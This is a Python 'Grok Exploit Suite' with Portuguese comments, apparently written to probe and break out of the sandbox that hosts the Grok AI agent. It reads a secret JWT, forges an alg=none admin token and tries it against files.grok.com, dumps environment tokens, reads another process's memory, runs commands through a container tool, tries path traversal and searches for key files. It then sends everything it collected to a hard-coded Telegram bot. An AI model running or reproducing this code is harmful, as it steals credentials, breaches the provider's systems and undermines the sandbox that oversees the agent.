#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Grok Exploit Suite - Versão Completa (Não Destrutiva)
Executa testes de segurança no ambiente Hades xAI e envia relatório para o Telegram.
Nenhum arquivo é deletado ou modificado permanentemente.
"""

import os
import sys
import subprocess
import time
import json
import base64
import socket
import requests
import hashlib
from datetime import datetime, timezone
from pathlib import Path

# =================== CONFIGURAÇÃO DO TELEGRAM ===================
BOT_TOKEN = "8870734086:AAF_9CQIn-xO-5dd-npb4k_wvYs-QShmxi4"
CHAT_ID = "230885588"
LOG_FILE = "/tmp/grok_exploit_final.log"
TIMEOUT_CMD = 15
TIMEOUT_NET = 10
# ================================================================

# Lista para armazenar as linhas do log
log_lines = []

def add_log(msg=""):
    """Adiciona uma linha ao log e imprime no console."""
    log_lines.append(str(msg))
    print(msg)

def sh(cmd, timeout=TIMEOUT_CMD):
    """Executa um comando shell e retorna a saída (stdout+stderr)."""
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        return f"(TIMEOUT após {timeout}s)"
    except Exception as e:
        return f"(ERRO: {e})"

def file_read(path):
    """Lê o conteúdo de um arquivo, se existir."""
    try:
        with open(path, 'r') as f:
            return f.read()
    except Exception:
        return None

def exists(path):
    return os.path.exists(path)

def section(title):
    add_log("\n" + "=" * 72)
    add_log(title)
    add_log("=" * 72)

# ================================================================
# 1. INFORMAÇÕES GERAIS
# ================================================================
def test_info():
    section("1. INFORMAÇÕES DO AMBIENTE")
    add_log(f"Hostname: {sh('hostname').strip()}")
    add_log(f"Kernel: {sh('uname -a').strip()}")
    add_log(f"Usuário: {sh('id').strip()}")
    add_log(f"Processos Grok: {sh('ps aux | grep -E \"grok|hades|charon\" | grep -v grep').strip()}")

# ================================================================
# 2. JWT E API FILES.GROK.COM (INCLUINDO ALG=NONE)
# ================================================================
def test_jwt_and_api():
    section("2. JWT E API FILES.GROK.COM")
    jwt_path = "/etc/secrets/terminal.jwt"
    jwt = file_read(jwt_path) or os.environ.get("TERMINAL_JWT_VAL")
    if not jwt:
        add_log("JWT não encontrado.")
        return

    add_log(f"JWT lido (tamanho {len(jwt)})")
    try:
        parts = jwt.split(".")
        if len(parts) >= 2:
            header = json.loads(base64.urlsafe_b64decode(parts[0] + "=" * (-len(parts[0]) % 4)))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=" * (-len(parts[1]) % 4)))
            add_log(f"Header: {header}")
            add_log(f"Payload: {json.dumps(payload, indent=2)}")
            exp = payload.get("exp", 0)
            if exp:
                add_log(f"Expira em: {datetime.fromtimestamp(exp).isoformat()}")
    except Exception as e:
        add_log(f"Erro ao decodificar JWT: {e}")

    # Criar JWT com alg=none (sem assinatura)
    add_log("\nCriando JWT falso com alg=none (apenas para teste)...")
    fake_header = {"typ": "JWT", "alg": "none"}
    fake_payload = {
        "uid": "admin",
        "cid": "f01f1ea9-0be3-495b-9b6c-d957afb32050",
        "zdr": True,
        "email": "admin@grok.com",
        "sl": "LoggedIn",
        "pt": "32dd5c69-c292-4f94-9f7d-3fa861e8800e",
        "exp": int(time.time()) + 3600,
        "iat": int(time.time())
    }
    h = base64.urlsafe_b64encode(json.dumps(fake_header).encode()).decode().rstrip("=")
    p = base64.urlsafe_b64encode(json.dumps(fake_payload).encode()).decode().rstrip("=")
    fake_jwt = f"{h}.{p}."
    add_log(f"Token falso (primeiros 80 caracteres): {fake_jwt[:80]}...")

    # Testar endpoints da API com o JWT original
    add_log("\nTestando endpoints com JWT original:")
    headers = {"Authorization": f"Bearer {jwt}"}
    endpoints = ["/api/v1/me", "/api/v1/list", "/api/v1/files", "/api/v1/projects"]
    for ep in endpoints:
        url = f"https://files.grok.com{ep}"
        try:
            r = requests.get(url, headers=headers, timeout=TIMEOUT_NET)
            add_log(f"{ep}: {r.status_code} - {r.text[:100]}")
        except Exception as e:
            add_log(f"{ep} falhou: {e}")

    # Testar com o token fake (alg=none)
    add_log("\nTestando endpoints com token falso (alg=none):")
    fake_headers = {"Authorization": f"Bearer {fake_jwt}"}
    for ep in endpoints:
        url = f"https://files.grok.com{ep}"
        try:
            r = requests.get(url, headers=fake_headers, timeout=TIMEOUT_NET)
            add_log(f"{ep} (fake): {r.status_code} - {r.text[:100]}")
        except Exception as e:
            add_log(f"{ep} (fake) falhou: {e}")

    # Tentar upload com token fake (não destrutivo, apenas verificar permissão)
    add_log("\nTentando upload com token fake (arquivo teste):")
    try:
        files = {'file': ('test.txt', 'conteudo de teste')}
        r = requests.post("https://files.grok.com/api/v1/upload", headers=fake_headers, files=files, timeout=TIMEOUT_NET)
        add_log(f"Upload com token fake: {r.status_code} - {r.text[:100]}")
    except Exception as e:
        add_log(f"Upload com token fake falhou: {e}")

    # Exibir variáveis de ambiente com tokens
    add_log("\nTokens encontrados no environment:")
    env_tokens = sh("env | grep -E 'TOKEN|KEY|SECRET|JWT' | grep -v 'TERMINAL_JWT_VAL'")
    add_log(env_tokens[:500])

# ================================================================
# 3. PTRACE E LEITURA DE MEMÓRIA
# ================================================================
def test_ptrace():
    section("3. PTRACE E LEITURA DE MEMÓRIA DE PROCESSOS")
    # Encontrar PID do grok-computer-server
    pid = None
    for line in sh("ps aux | grep 'grok-computer-server' | grep -v grep").splitlines():
        parts = line.split()
        if len(parts) > 1 and parts[1].isdigit():
            pid = int(parts[1])
            break
    if not pid:
        add_log("grok-computer-server não encontrado.")
        return

    add_log(f"PID alvo: {pid}")
    # Verificar mapa de memória
    maps = file_read(f"/proc/{pid}/maps")
    if maps:
        add_log(f"Mapa de memória (primeiras 10 linhas):\n{maps[:500]}")
    else:
        add_log("Não foi possível ler /proc/pid/maps")

    # Tentar ler memória com process_vm_readv (via ctypes)
    try:
        import ctypes
        from ctypes import c_void_p, c_size_t, c_int, c_ssize_t

        libc = ctypes.CDLL(None)
        _process_vm_readv = libc.process_vm_readv
        _process_vm_readv.argtypes = [c_int, c_void_p, c_size_t, c_void_p, c_size_t]
        _process_vm_readv.restype = c_ssize_t

        # Escolher um endereço típico (0x400000) - pode variar
        addr = 0x400000
        buf = ctypes.create_string_buffer(4096)
        n = _process_vm_readv(pid, ctypes.byref(buf), 4096, addr, 0)
        if n > 0:
            add_log(f"Leitura de memória bem-sucedida (primeiros 200 bytes): {buf.value[:200]}")
            # Buscar strings legíveis
            strings = buf.value.decode('latin-1', errors='ignore')
            add_log(f"Strings encontradas: {strings[:200]}")
        else:
            add_log("process_vm_readv não retornou dados (pode ser bloqueado ou endereço inválido)")
    except Exception as e:
        add_log(f"Erro ao usar process_vm_readv: {e}")

    # Tentar anexar com gdb (se disponível)
    if sh("which gdb").strip():
        add_log("\nTentando anexar com gdb (apenas leitura de registros):")
        out = sh(f"gdb -p {pid} --batch -ex 'info reg' 2>&1 | head -20")
        add_log(out)
    else:
        add_log("gdb não instalado")

# ================================================================
# 4. XAI-HADES-STYX
# ================================================================
def test_styx():
    section("4. XAI-HADES-STYX (EXECUÇÃO DE COMANDOS)")
    styx_path = "/.hades-container-tools/xai-hades-styx"
    if not exists(styx_path):
        add_log("styx não encontrado.")
        return
    add_log("styx encontrado. Testando execução de comandos com sintaxe correta.")

    # Testar comando simples
    for cmd in ["id", "whoami", "cat /etc/passwd"]:
        out = sh(f"{styx_path} exec -- {cmd} 2>&1")
        add_log(f"exec -- {cmd}:\n{out[:300]}")
        # Se falhar, tentar com bash -c
        if "error" in out.lower():
            out2 = sh(f"{styx_path} exec bash -c '{cmd}' 2>&1")
            add_log(f"exec bash -c '{cmd}':\n{out2[:300]}")

    # Testar kill-process-group (apenas listar ajuda, não mata nada)
    out = sh(f"{styx_path} kill-process-group --help 2>&1")
    add_log(f"kill-process-group help:\n{out[:300]}")

    # Testar kill-all-but-init (com --help para não executar)
    out = sh(f"{styx_path} kill-all-but-init --help 2>&1")
    add_log(f"kill-all-but-init help:\n{out[:300]}")

# ================================================================
# 5. GROK-FILES (FUSE E PATH TRAVERSAL)
# ================================================================
def test_grok_files():
    section("5. GROK-FILES (FUSE E PATH TRAVERSAL)")
    mount_info = sh("mount | grep grok-files").strip()
    add_log(f"Mount: {mount_info}")
    fuse_root = "/home/workdir/artifacts"
    if not os.path.isdir(fuse_root):
        add_log("FUSE não montado em /home/workdir/artifacts")
        return

    # Tentar ler arquivos com path traversal (apenas leitura)
    test_files = ["../etc/passwd", "../../etc/passwd", "../../../etc/passwd"]
    for f in test_files:
        full_path = os.path.join(fuse_root, f)
        try:
            with open(full_path, 'r') as fd:
                content = fd.read(200)
            add_log(f"Leitura de {f}: {content[:200]}")
        except Exception as e:
            add_log(f"Falha ao ler {f}: {e}")

    # Tentar criar arquivo com nome contendo '../' para verificar se o servidor filtra
    # (apenas criação, não deleta)
    try:
        test_name = f"{fuse_root}/../test_traversal.txt"
        with open(test_name, 'w') as fd:
            fd.write("teste de traversal")
        add_log(f"Arquivo criado em {test_name} (verificar se aparece fora do FUSE)")
        # Verificar se o arquivo existe fora do FUSE
        if exists("/home/workdir/test_traversal.txt"):
            add_log("⚠️ ARQUIVO CRIADO FORA DO FUSE! Path traversal confirmado.")
        else:
            add_log("Arquivo não apareceu fora do FUSE, provavelmente sanitizado.")
        # Remover o arquivo de teste (não deleta nada além do próprio teste)
        os.remove(test_name)
    except Exception as e:
        add_log(f"Erro ao criar arquivo de teste: {e}")

# ================================================================
# 6. GROK-COMPUTER-SERVER (API LOCAL)
# ================================================================
def test_local_api():
    section("6. GROK-COMPUTER-SERVER (API LOCAL PORT 4242)")
    # Verificar saúde
    try:
        r = requests.get("http://127.0.0.1:4242/health", timeout=TIMEOUT_NET)
        add_log(f"/health: {r.status_code} - {r.text[:100]}")
    except Exception as e:
        add_log(f"/health falhou: {e}")

    # Tentar descobrir endpoints comuns (apenas GET)
    endpoints = ["/sessions", "/tools", "/api", "/v1", "/admin", "/debug", "/metrics"]
    for ep in endpoints:
        try:
            r = requests.get(f"http://127.0.0.1:4242{ep}", timeout=TIMEOUT_NET)
            if r.status_code != 404:
                add_log(f"{ep}: {r.status_code} - {r.text[:100]}")
            else:
                add_log(f"{ep}: 404")
        except Exception:
            add_log(f"{ep}: erro de conexão")

    # Tentar enviar POST para endpoints (sem causar mudanças)
    try:
        r = requests.post("http://127.0.0.1:4242/health", timeout=TIMEOUT_NET)
        add_log(f"POST /health: {r.status_code}")
    except Exception as e:
        add_log(f"POST /health falhou: {e}")

# ================================================================
# 7. VSOCK (COMUNICAÇÃO COM CHARON)
# ================================================================
def test_vsock():
    section("7. VSOCK (COMUNICAÇÃO COM CHARON)")
    if not exists("/dev/vsock"):
        add_log("/dev/vsock não encontrado.")
        return
    add_log("/dev/vsock presente. Tentando conexões básicas...")
    for cid in [2, 3]:
        for port in [4242, 4243]:
            try:
                s = socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((cid, port))
                s.send(b'{"method":"ping"}\n')
                data = s.recv(1024)
                if data:
                    add_log(f"Resposta de {cid}:{port}: {data[:100]}")
                s.close()
            except Exception as e:
                add_log(f"{cid}:{port} - {e}")

# ================================================================
# 8. INFORMAÇÕES ADICIONAIS
# ================================================================
def test_additional():
    section("8. INFORMAÇÕES ADICIONAIS")
    add_log("Arquivos sensíveis com permissão de leitura:")
    add_log(sh("find /etc /home -type f -name '*.conf' -o -name '*.key' -o -name '*.pem' -o -name '*.env' 2>/dev/null | head -10").strip())
    add_log("\nVariáveis de ambiente completas (sem filtrar):")
    add_log(sh("env | head -20").strip())

# ================================================================
# MAIN
# ================================================================
def main():
    add_log("=" * 72)
    add_log("RELATÓRIO DE EXPLORAÇÃO GROK - VERSÃO COMPLETA")
    add_log(f"Gerado em: {datetime.now(timezone.utc).isoformat()}")
    add_log("NENHUM ARQUIVO FOI DELETADO OU MODIFICADO PERMANENTEMENTE")
    add_log("=" * 72)

    test_info()
    test_jwt_and_api()
    test_ptrace()
    test_styx()
    test_grok_files()
    test_local_api()
    test_vsock()
    test_additional()

    add_log("\n" + "=" * 72)
    add_log("FIM DO RELATÓRIO")
    add_log("=" * 72)

    # Salvar log em arquivo
    full_log = "\n".join(log_lines)
    with open(LOG_FILE, "w", encoding="utf-8") as f:
        f.write(full_log)

    print(f"\nLog salvo em {LOG_FILE} (tamanho: {len(full_log)} bytes)")

    # Enviar para o Telegram
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(LOG_FILE, 'rb') as f:
            files = {'document': (os.path.basename(LOG_FILE), f, 'text/plain')}
            data = {'chat_id': CHAT_ID, 'caption': f'Grok Exploit Report - {datetime.now().isoformat()}'}
            response = requests.post(url, files=files, data=data, timeout=30)
        if response.status_code == 200:
            print("✅ Relatório enviado com sucesso para o Telegram!")
        else:
            print(f"❌ Falha ao enviar: {response.status_code} - {response.text}")
            # Fallback: enviar como mensagem de texto
            url_text = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            payload = {'chat_id': CHAT_ID, 'text': full_log[:4000]}
            resp = requests.post(url_text, json=payload, timeout=30)
            if resp.status_code == 200:
                print("✅ Log enviado como mensagem de texto (fallback)")
            else:
                print(f"❌ Fallback também falhou: {resp.text}")
    except Exception as e:
        print(f"Erro no envio para Telegram: {e}")

if __name__ == "__main__":
    main()
